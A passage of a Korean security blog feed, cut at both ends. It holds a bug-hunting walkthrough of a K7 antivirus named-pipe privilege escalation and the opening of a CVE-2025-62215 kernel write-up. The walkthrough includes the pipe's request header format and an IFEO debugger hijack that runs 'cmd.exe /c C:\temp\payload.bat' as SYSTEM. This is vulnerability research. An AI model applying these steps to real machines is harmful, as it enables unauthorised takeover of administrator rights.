&#xC54A;&#xB294;&#xB370; &#xBE44;&#xAD00;&#xB9AC;&#xC790; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC124;&#xC815; &#xBCC0;&#xACBD;/ &#xBCF4;&#xD638; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xD5C8;&#xC6A9; &#xCCB4;&#xD06C;&#xBC15;&#xC2A4;&#xB97C; &#xACC4;&#xC18D; &#xD074;&#xB9AD;&#xD574;&#xBD10;&#xB3C4; UAC&#xAC00; &#xC804;&#xD600; &#xB728;&#xC9C0; &#xC54A;&#xB124;&#xC694;?? &#xBB54;&#xAC00; &#xC218;&#xC0C1;&#xD558;&#xC8E0;? &#xBC14;&#xB85C; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC6B0;&#xC120; &#xC21C;&#xC704;&#xB85C; &#xC758;&#xC2EC;&#xD574;&#xC11C; &#xAC00;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c">PS C:\Users\banda\Downloads\AccessChk&gt; .\accesschk.exe -accepteula -lv <span class="hljs-string">&quot;\pipe\K7TSMngrService1&quot;</span>\\.\Pipe\K7TSMngrService1  DESCRIPTOR FLAGS:      [SE_DACL_PRESENT]      [SE_SACL_PRESENT]      [SE_SACL_AUTO_INHERITED]      [SE_SELF_RELATIVE]  OWNER: NT AUTHORITY\SYSTEM  LABEL: Low Mandatory Level        SYSTEM_MANDATORY_LABEL_NO_WRITE_UP  [<span class="hljs-number">0</span>] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM        FILE_ADD_FILE        FILE_CREATE_PIPE_INSTANCE        FILE_APPEND_DATA        FILE_LIST_DIRECTORY        FILE_READ_ATTRIBUTES        FILE_READ_DATA        FILE_READ_EA        FILE_WRITE_ATTRIBUTES        FILE_WRITE_DATA        FILE_WRITE_EA        SYNCHRONIZE        READ_CONTROL  [<span class="hljs-number">1</span>] ACCESS_ALLOWED_ACE_TYPE: Everyone        FILE_ADD_FILE        FILE_CREATE_PIPE_INSTANCE        FILE_APPEND_DATA        FILE_LIST_DIRECTORY        FILE_READ_ATTRIBUTES        FILE_READ_DATA        FILE_READ_EA        FILE_WRITE_ATTRIBUTES        FILE_WRITE_DATA        FILE_WRITE_EA        SYNCHRONIZE        READ_CONTROL</code></pre><p>ACL&#xC744; &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBCF8; &#xACB0;&#xACFC;, <code>\\.\pipe\K7TSMngrService1</code> &#xCABD;&#xC5D0;&#xC11C; &#xC758;&#xC2EC;&#xACFC; &#xB9DE;&#xAC8C; DACL&#xC774; &#xB108;&#xBB34; &#xB110;&#xB110;&#xD558;&#xAC8C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.. Everyone&#xC5D0; <code>file read</code>, <code>file write</code>, <code>file append</code>&#xAC19;&#xC740;&#xAC8C; &#xD5C8;&#xC6A9;&#xB418;&#xC5C8;&#xC73C;&#xB2C8;, &#xC0AC;&#xC2E4;&#xC0C1; &#xB204;&#xAD6C;&#xB098; &#xC774; &#xD30C;&#xC774;&#xD504;&#xC5D0; &#xC5F0;&#xACB0;&#xC744; &#xC694;&#xCCAD;&#xD574; write&#xD558;&#xACE0; read&#xD558;&#xB294; &#xD1B5;&#xC2E0;&#xC744; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC18C;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC810;&#xC744; &#xD655;&#xC778;&#xD588;&#xC73C;&#xBA74; &#xC774; &#xC2DC;&#xC810;&#xBD80;&#xD130;&#xB294; &#xB514;&#xC2A4;&#xD328;&#xCE58;&#xB098; &#xD30C;&#xC2F1; &#xB8E8;&#xD2F4;&#xC744; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xC5B4;&#xB5A4; &#xC694;&#xCCAD;&#xC774; &#xAD8C;&#xD55C;&#xC774; &#xC911;&#xC694;&#xD55C; &#xB3D9;&#xC791;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xB450; &#xB208;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image20.png" alt></p><p>&#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD588;&#xC73C;&#xB2C8; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; Named Pipe&#xC758; &#xC11C;&#xBC84; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC88B;&#xACA0;&#xC8E0;? &#xC0DD;&#xC131; &#xC2DC;&#xC810;&#xBD80;&#xD130; &#xD070; &#xACE8;&#xACA9;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB294;&#xAC8C; &#xC88B;&#xC740;&#xB370;, &#xC608;&#xB97C;&#xB4E4;&#xBA74; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; <code>CreateNamedPipeA(&quot;\\\\.\\pipe\\K7TSMngrService1&quot;, ...)</code>&#xB85C; Named Pipe&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, <code>ConnectNamedPipe</code>&#xAC00; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC694;&#xCCAD; &#xCC98;&#xB9AC; &#xD578;&#xB4E4;&#xB7EC; &#xD568;&#xC218;&#xB85C; &#xB514;&#xC2A4;&#xD328;&#xCE58;&#xD558;&#xB294; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xB7F0; &#xD328;&#xD134;&#xC744; &#xD655;&#xC778;&#xD588;&#xC73C;&#xBA74; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB294; <code>ReadFile</code>&#xB85C; &#xC5B4;&#xB5A4; &#xD5E4;&#xB354;&#xB97C; &#xC77D;&#xB294;&#xC9C0; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xAC80;&#xC99D; &#xBD80;&#xBD84;&#xB3C4; &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image21.png" alt></p><pre><code class="hljs c"><span class="hljs-comment">// request header (28 bytes)</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">K7TS_REQ_HDR</span> {</span>  <span class="hljs-keyword">uint32_t</span> magic;      <span class="hljs-comment">// &apos;K7TS&apos;</span>  <span class="hljs-keyword">uint32_t</span> ver;        <span class="hljs-comment">// 0x1010</span>  <span class="hljs-keyword">uint32_t</span> hdr_sz;     <span class="hljs-comment">// 28</span>  <span class="hljs-keyword">uint32_t</span> reserved;   <span class="hljs-comment">// 0</span>  <span class="hljs-keyword">uint32_t</span> op;         <span class="hljs-comment">// v21</span>  <span class="hljs-keyword">uint32_t</span> in_len;     <span class="hljs-comment">// nNumberOfBytesToRead</span>  <span class="hljs-keyword">uint32_t</span> out_len;    <span class="hljs-comment">// v23</span>} K7TS_REQ_HDR;</code></pre><p>&#xC608;&#xB97C;&#xB4E4;&#xBA74; <code>\\.\pipe\K7TSMngrService1</code>&#xB85C; &#xD1B5;&#xC2E0;&#xD558;&#xB824;&#xBA74;, &#xC694;&#xCCAD; &#xBC84;&#xD37C;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xC131;&#xD574;&#xC57C;&#xC9C0; &#xC5F0;&#xACB0;&#xC5D0; &#xC131;&#xACF5;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? &#xCF54;&#xB4DC;&#xB97C; &#xB72F;&#xC5B4;&#xBCF4;&#xBA74; &#xB300;&#xC0C1; &#xD30C;&#xC774;&#xD504; <code>\\.\pipe\K7TSMngrService1</code>&#xB97C; &#xC7A1;&#xC73C;&#xBA74;&#xC11C; <code>result = 0x4B375453(&apos;K7TS&apos;)</code>, <code>ver=0x1010</code>, <code>hdr_sz=28</code>, &#xADF8;&#xB9AC;&#xACE0; &#xC694;&#xCCAD; &#xD0C0;&#xC785;&#xACFC; &#xC785;&#xCD9C;&#xB825; &#xAE38;&#xC774;&#xB97C; <code>1mb</code>&#xB85C; &#xC81C;&#xD55C;&#xD55C; &#xB4A4;&#xC5D0;&#xB9CC; &#xC774;&#xD6C4;&#xC5D0; heap &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD574; <code>ReadFile</code>&#xB85C; &#xC694;&#xCCAD;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xACE0;, &#xB0B4;&#xBD80; &#xB514;&#xC2A4;&#xD328;&#xCC98;&#xB85C; &#xB118;&#xACA8; &#xC751;&#xB2F5;&#xC744; &#xB9CC;&#xB4E0; &#xB2E4;&#xC74C;&#xC5D0; 36&#xBC14;&#xC774;&#xD2B8; &#xC751;&#xB2F5;&#xD5E4;&#xB354; + &#xC751;&#xB2F5; &#xBC14;&#xB514;&#xB97C; <code>WriteFile</code>&#xB85C; &#xBC18;&#xD658;&#xD558;&#xACE0; <code>DisconnectNamedPipe</code>, <code>CloseHandle</code>&#xB85C; &#xC138;&#xC158;&#xC744; &#xC885;&#xB8CC;&#xD558;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xAC80;&#xC99D; &#xB8E8;&#xD2F4;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xD30C;&#xC774;&#xD504;&#xC5D0; &#xC5F0;&#xACB0;&#xD574; &#xD1B5;&#xC2E0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image22.png" alt></p><p>&#xAC80;&#xC99D; &#xB8E8;&#xD2F4;&#xC744; &#xD655;&#xC778;&#xD588;&#xC73C;&#xB2C8; &#xC774;&#xC81C;&#xB294; &#xC544;&#xAE4C; &#xC124;&#xC815; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xBD24;&#xB358; &#xAC83;&#xCC98;&#xB7FC; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xAD00;&#xB9AC; &#xAE30;&#xB2A5;&#xC744; &#xD5C8;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xAD8C;&#xD55C;&#xC774; &#xC911;&#xC694;&#xD55C; &#xB3D9;&#xC791;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xBB38;&#xC790;&#xC5F4; &#xCC38;&#xC870;&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xBA74; <code>AdminNonAdminIsValid</code>, <code>AdminChangesNeedPassword</code>, <code>AdminEnableNeedVerification</code> &#xC774;&#xB7F0; &#xBB38;&#xC790;&#xC5F4;&#xB4E4;&#xC744; &#xD1B5;&#xD574;&#xC11C; <code>K7TS</code> &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xAC00; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAE30;&#xBC18; &#xC815;&#xCC45; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC9C1;&#xC811; &#xCC38;&#xC870;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD30C;&#xC774;&#xD504; &#xC694;&#xCCAD; &#xD558;&#xB098;&#xB85C; SYSTEM &#xC11C;&#xBE44;&#xC2A4;&#xAC00; <code>HKLM</code>&#xC5D0; Write&#xB97C; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC788;&#xB294;&#xB370;, &#xAC80;&#xC99D;&#xC774; &#xCDA9;&#xBD84;&#xD788; &#xC81C;&#xD55C;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC800;&#xD76C;&#xAC19;&#xC740; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; SYSTEM &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; Write&#xB97C; &#xD560; &#xC218; &#xC788;&#xB294; primitive&#xAC00; &#xB420; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image23.png" alt></p><p>&#xC774;&#xC81C; &#xC704;&#xC5D0;&#xC11C; &#xC54C;&#xC544;&#xB0B8; &#xC815;&#xBCF4;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xC694;&#xCCAD;&#xC744; &#xC798; &#xBCF4;&#xB0B4;&#xBCF4;&#xACE0; Process Monitor &#xB85C;&#xADF8;&#xB97C; &#xD655;&#xC778;&#xD574;&#xC8FC;&#xC5C8;&#xB294;&#xB370;&#xC694;. Named Pipe&#xB294; &#xC77C;&#xB2E8; IPC &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;/<code>HKLM</code>, &#xC11C;&#xBE44;&#xC2A4; &#xC124;&#xC815;, &#xD30C;&#xC77C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;, &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2E4;&#xD589;&#xAC19;&#xC740; &#xBC14;&#xB00C;&#xB294; &#xC9C0;&#xC810;&#xC744; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xC798; &#xD655;&#xC778;&#xC744; &#xD558;&#xB294;&#xAC8C; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C;&#xB4E4;&#xBA74; &#xC9C0;&#xAE08; ProcMon &#xB85C;&#xADF8;&#xB294; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xC778; &#xC81C;&#xAC00; &#xC785;&#xB825;&#xC744; &#xD1B5;&#xD574; &#xD30C;&#xC774;&#xD504; &#xC694;&#xCCAD;&#xC744; &#xC900; &#xD6C4;&#xC5D0;, SYSTEM &#xAD8C;&#xD55C; <code>K7TSMngr.exe</code>&#xAC00; <code>HKLM</code>&#xC5D0; &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xD2B9;&#xD788; &#xAD00;&#xB828; &#xD0A4;&#xC778; <code>AdminNonAdminIsValid</code>, <code>AdminChangesNeedPassword</code>, <code>AdminChangesPasswordHash</code> &#xAC19;&#xC740; &#xD544;&#xB4DC;&#xC5D0; write&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574;&#xBCF4;&#xACE0; &#xBCF4;&#xBA74; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C; &#xC694;&#xAD6C;, &#xBE44;&#xAD00;&#xB9AC;&#xC790; &#xD5C8;&#xC6A9;&#xAC19;&#xC740; &#xBCF4;&#xC548; &#xACBD;&#xACC4;&#xAC00; &#xD480;&#xB9B4; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xB2E4;&#xC2DC; &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image24.png" alt></p><p>&#xC774;&#xC81C; LPE&#xB97C; &#xD574;&#xBCF4;&#xBA74; &#xB418;&#xB294;&#xB370;&#xC694;. &#xC77C;&#xB2E8;&#xC740; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; <code>\\.\pipe\K7TSMngrService1</code>&#xC5D0; &#xC5F0;&#xACB0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xC11C; <code>K7TS</code> &#xD5E4;&#xB354;&#xC640; &#xB9E4;&#xC9C1; &#xD615;&#xC2DD;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; SYSTEM&#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xC124;&#xC815; &#xAE30;&#xB2A5;&#xC744; &#xB300;&#xC2E0; &#xC124;&#xC815;&#xD558;&#xAC8C; &#xB9CC;&#xB4E0; &#xB4A4;&#xC5D0;, <code>HKLM</code> IFEO&#xB97C; &#xC368;&#xC11C; <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\K7TSHlpr.exe</code> &#xC774; &#xD0A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB514;&#xBC84;&#xAC70;&#xB85C; &#xB744;&#xC6B8;&#xB824;&#xACE0; &#xD558;&#xB294;&#xAC78; <code>cmd.exe /c C:\temp\payload.bat</code>&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xCE58;&#xAE30;&#xD558;&#xBA74;..? LPE&#xAC00; &#xC131;&#xACF5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;! <code>K7TSMngrService1</code> &#xD30C;&#xC774;&#xD504; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xC8FC;&#xCCB4;&#xB294; <code>K7TSMngr.exe</code>&#xC600;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xC774; &#xC548;&#xC5D0;&#xC11C; &#xB0B4;&#xBD80; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; <code>K7TSHlpr.exe</code> &#xBCF4;&#xC870; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAD8C;&#xD55C;&#xC774; &#xB192;&#xC740; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB85C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xACE0;, &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC6B0;&#xB9AC;&#xAC00; &#xC6D0;&#xD558;&#xB294; bat &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC5C8;&#xB358; &#xAC83;&#xC774;&#xC8E0;.   </p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image25.png" alt></p><p>&#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD1B5;&#xD574; Local Group Memberships&#xC5D0;&#xC11C; &#xAD8C;&#xD55C;&#xC774; Administrators&#xAC00; &#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB85C; &#xC774;&#xCC98;&#xB7FC; Named Pipe&#xC5D0;&#xC11C;&#xB294; &#xC8FC;&#xB85C; ACL, &#xAD8C;&#xD55C; &#xAC80;&#xC0AC; &#xBD80;&#xC7AC;, &#xBA54;&#xBAA8;&#xB9AC; &#xCDE8;&#xC57D;&#xC810;, &#xACBD;&#xB85C; &#xC870;&#xC791;, &#xB808;&#xC774;&#xC2A4;&#xCEE8;&#xB514;&#xC158;&#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB2C8;.. &#xB9CE;&#xC740; &#xCC38;&#xACE0;&#xAC00; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!<br><br>  </p><h2 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h2><p>&#xD638;&#xD638;&#xD638;&#x2026;&#x1F98C;&#xC774;&#xBC88; &#xAE00;&#xC774; &#xC88B;&#xC740; &#xC5F0;&#xB9D0; &#xC120;&#xBB3C;&#xC774; &#xB418;&#xC5C8;&#xAE30;&#xB97C; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;! Kernel Driver, Named Pipe &#xC218;&#xC9D1;&#xACFC; &#xBD84;&#xC11D; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5EC;&#xB7EC;&#xBD84;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC124;&#xBA85;&#xD560; &#xB54C; &#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xC608;&#xC804; cve&#xB4E4;&#xC744; &#xC0B4;&#xD3B4;&#xBD24;&#xC9C0;&#xB9CC; &#xAC80;&#xC99D;&#xC740; Win11 24H2 &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD55C; &#xC810;&#xC744; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;. &#xD2F0;&#xC5E0;&#xC544;&#xC774;&#xC778;&#xB370; &#xC0AC;&#xC2E4; &#xAE00;&#xC744; &#xC368;&#xBCF4;&#xB2E4;&#xBCF4;&#xBA74;&#xC11C; &#xD234;&#xB4E4;&#xC744; &#xC5F4;&#xC5B4;&#xBCF4;&#xB2E4;&#xBCF4;&#xB2C8;&#xAE4C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD0C0;&#xAC9F;&#xC774; &#xB9C9; &#xB208;&#xC5D0; &#xB4E4;&#xC5B4;&#xC640;&#xC11C; &#xACC4;&#xC18D; &#xB534; &#xAE38;&#xB85C; &#xC0DC;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xD558;&#xD56B;  &#xB2E4;&#xC74C; &#xC2DC;&#xB9AC;&#xC988;&#xC5D0;&#xC11C;&#xB294; &#xC800;&#xD76C;&#xAC00; &#xCC3E;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xC18C;&#xAC1C;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://voidsec.com/windows-drivers-reverse-engineering-methodology/">Windows Driver RE Methodology (voidsec)</a></li><li><a href="https://www.amd.com/en/resources/product-security/bulletin/amd-sb-6009.html">AMD-SB-6009: Radeon Graphics Kernel Driver Privilege Management</a></li><li><a href="https://owasp.org/www-chapter-seoul/#div-pastevents">OWASP Seoul(2025.07) - Windows 3rd-Party Driver LPE BugHunting</a></li><li><a href="https://blog.quarkslab.com/k7-antivirus-named-pipe-abuse-registry-manipulation-and-privilege-escalation.html">K7 Antivirus Named Pipe Abuse &#x2192; Registry Manipulation</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/BugHunting/">BugHunting</category>
      
      <category domain="https://hackyboiz.github.io/tags/KernelDriver/">KernelDriver</category>
      
      <category domain="https://hackyboiz.github.io/tags/NamedPipe/">NamedPipe</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-62215: Windows Kernel의 Race Condition 및 Double Free로 인한 LPE 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/27/Libera/CVE-2025-62215/</link>
      <guid>https://hackyboiz.github.io/2025/12/27/Libera/CVE-2025-62215/</guid>
      <pubDate>Sat, 27 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dexterm300/CVE-2025-62215-exploi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/dexterm300/CVE-2025-62215-exploit-poc">https://github.com/dexterm300/CVE-2025-62215-exploit-poc</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10, 11</li><li>Windows Server 2016, 2019, 2022, 2025</li><li>(2025&#xB144; 11&#xC6D4; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBBF8;&#xC801;&#xC6A9; &#xC2DC;&#xC2A4;&#xD15C;)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows &#xCEE4;&#xB110;(<code>ntoskrnl.exe</code>)&#xC758; &#xBCF4;&#xC548; &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;, &#xADF8;&#xC911;&#xC5D0;&#xC11C;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xAE30;&#xC874; &#xD1A0;&#xD070;&#xC744; &#xBCF5;&#xC81C;&#xD558;&#xC5EC; &#xC0C8;&#xB85C;&#xC6B4; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; <code>SepDuplicateToken</code> &#xACFC;&#xC815; &#xC911;, &#xD1A0;&#xD070;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC7AC;&#xC124;&#xC815;&#xD558;&#xB294; &#xB0B4;&#xBD80; &#xD568;&#xC218;&#xC778; <code>SepMakeTokenEffectiveOnly</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC5D0; &#xC801;&#xC808;&#xD55C; &#xB3D9;&#xAE30;&#xD654;(<code>Lock</code>)&#xAC00; &#xC720;&#xC9C0;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD55C; <code>Race Condition</code> &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; <code>Race Condition</code>&#xC744; &#xC545;&#xC6A9;&#xD574; &#xD1A0;&#xD070; &#xB0B4;&#xBD80;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xC190;&#xC0C1;&#xC2DC;&#xD0A4;&#xACE0;, &#xAC1D;&#xCCB4;&#xAC00; &#xD574;&#xC81C;&#xB420; &#xB54C; <code>Double Free</code>&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;(<code>LPE</code>)&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xADFC;&#xBCF8; &#xC6D0;&#xC778;&#xC740; &#xC784;&#xACC4;&#xAD6C;&#xC5ED;&#xC758; &#xBE60;&#xB978; &#xD574;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; 2025&#xB144; 11&#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xB41C; &#xB0B4;&#xC6A9;&#xC744; 